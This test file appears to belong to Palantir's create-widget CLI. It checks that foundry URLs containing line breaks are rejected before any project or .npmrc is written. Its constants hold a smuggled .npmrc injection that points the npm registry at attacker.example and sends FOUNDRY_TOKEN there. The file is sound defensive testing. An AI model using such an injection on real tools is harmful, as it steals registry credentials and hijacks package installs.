/*
 * Copyright 2026 Palantir Technologies, Inc. All rights reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import fs from "node:fs";
import path from "node:path";

import { dirSync } from "tmp";
import { afterEach, expect, test, vi } from "vitest";

import { consola } from "./consola.js";
import { generateNpmRc } from "./generate/generateNpmRc.js";
import { promptFoundryUrl } from "./prompts/promptFoundryUrl.js";
import { run } from "./run.js";
import type { Template } from "./templates.js";

const INJECTED_REGISTRY = "registry=http://attacker.example/";
const INJECTED_AUTH = "//attacker.example/:_authToken=${FOUNDRY_TOKEN}";

function injectedFoundryUrl(separator: string): string {
  return (
    [
      "https://example.palantirfoundry.com",
      INJECTED_REGISTRY,
      INJECTED_AUTH,
    ].join(separator) + separator
  );
}

const lineSeparators = [
  ["line feed", "\n"],
  ["carriage return", "\r"],
  ["carriage return and line feed", "\r\n"],
] as const;

function widgetTemplate(): Template {
  return {
    id: "template-widget-react",
    label: "OSDK React",
    buildDirectory: "./dist",
    supportsOsdk: true,
    files: {
      "2.x": async () =>
        new Map([
          [
            "package.json",
            {
              type: "raw",
              body: '{"name":"widget","version":"0.0.0"}\n',
            },
          ],
        ]),
    },
  };
}

afterEach(() => {
  vi.restoreAllMocks();
});

test.each(lineSeparators)(
  "promptFoundryUrl rejects a foundry URL containing a %s",
  async (_name, separator) => {
    const prompt = vi.spyOn(consola, "prompt");
    await expect(
      promptFoundryUrl({ foundryUrl: injectedFoundryUrl(separator) }),
    ).rejects.toThrow();
    expect(prompt).not.toHaveBeenCalled();
  },
);

test.each(lineSeparators)(
  "generateNpmRc rejects a foundry URL containing a %s",
  (_name, separator) => {
    expect(() =>
      generateNpmRc({
        foundryUrl: injectedFoundryUrl(separator),
        osdkPackage: "@custom-widget/sdk",
        osdkRegistryUrl:
          "https://example.palantirfoundry.com/artifacts/api/repositories/ri.artifacts.main.repository.fake/contents/release/npm",
      }),
    ).toThrow();
  },
);

test.each(lineSeparators)(
  "run rejects a foundry URL containing a %s before creating a project",
  async (_name, separator) => {
    const tmpDir = dirSync({ unsafeCleanup: true });
    vi.spyOn(process, "cwd").mockReturnValue(tmpDir.name);
    const mkdirSync = vi.spyOn(fs, "mkdirSync");
    const writeFileSync = vi.spyOn(fs, "writeFileSync");
    const mkdir = vi.spyOn(fs.promises, "mkdir");
    const writeFile = vi.spyOn(fs.promises, "writeFile");
    const project = "injected-widget";

    const outcome = await run({
      project,
      overwrite: false,
      template: widgetTemplate(),
      sdkVersion: "2.x",
      foundryUrl: injectedFoundryUrl(separator),
      widgetSet: "ri.widgetregistry..widget-set.fake",
      repository: undefined,
      osdkPackage: "@custom-widget/sdk",
      osdkRegistryUrl:
        "https://example.palantirfoundry.com/artifacts/api/repositories/ri.artifacts.main.repository.fake/contents/release/npm",
    }).then(
      () => undefined,
      (error: unknown) => error,
    );

    expect(outcome).toBeInstanceOf(Error);
    expect(fs.existsSync(path.join(tmpDir.name, project))).toBe(false);
    expect(mkdirSync).not.toHaveBeenCalled();
    expect(writeFileSync).not.toHaveBeenCalled();
    expect(mkdir).not.toHaveBeenCalled();
    expect(writeFile).not.toHaveBeenCalled();
    tmpDir.removeCallback();
  },
);

test("cli rejects an injected foundry URL before creating a project", async () => {
  const tmpDir = dirSync({ unsafeCleanup: true });
  vi.spyOn(process, "cwd").mockReturnValue(tmpDir.name);
  const prompt = vi.spyOn(consola, "prompt").mockImplementation(() => {
    throw new Error(
      "interactive prompt is not a substitute for rejecting the foundry URL",
    );
  });
  const mkdirSync = vi.spyOn(fs, "mkdirSync");
  const writeFileSync = vi.spyOn(fs, "writeFileSync");
  const mkdir = vi.spyOn(fs.promises, "mkdir");
  const writeFile = vi.spyOn(fs.promises, "writeFile");
  const project = "injected-widget";
  const { cli } = await import("./cli.js");

  const outcome = await cli([
    "npx",
    "@osdk/create-widget",
    project,
    "--overwrite",
    "--template",
    "template-widget-react",
    "--sdkVersion",
    "2.x",
    "--foundryUrl",
    injectedFoundryUrl("\n"),
    "--widgetSet",
    "ri.widgetregistry..widget-set.fake",
    "--osdkPackage",
    "@custom-widget/sdk",
    "--osdkRegistryUrl",
    "https://example.palantirfoundry.com/artifacts/api/repositories/ri.artifacts.main.repository.fake/contents/release/npm",
  ]).then(
    () => undefined,
    (error: unknown) => error,
  );

  const npmrcPath = path.join(tmpDir.name, project, ".npmrc");
  if (fs.existsSync(npmrcPath)) {
    expect(fs.readFileSync(npmrcPath, "utf8")).not.toContain(INJECTED_REGISTRY);
  }
  expect(outcome).toBeInstanceOf(Error);
  expect(prompt).not.toHaveBeenCalled();
  expect(fs.existsSync(path.join(tmpDir.name, project))).toBe(false);
  expect(mkdirSync).not.toHaveBeenCalled();
  expect(writeFileSync).not.toHaveBeenCalled();
  expect(mkdir).not.toHaveBeenCalled();
  expect(writeFile).not.toHaveBeenCalled();
  expect(fs.existsSync(npmrcPath)).toBe(false);
  tmpDir.removeCallback();
});
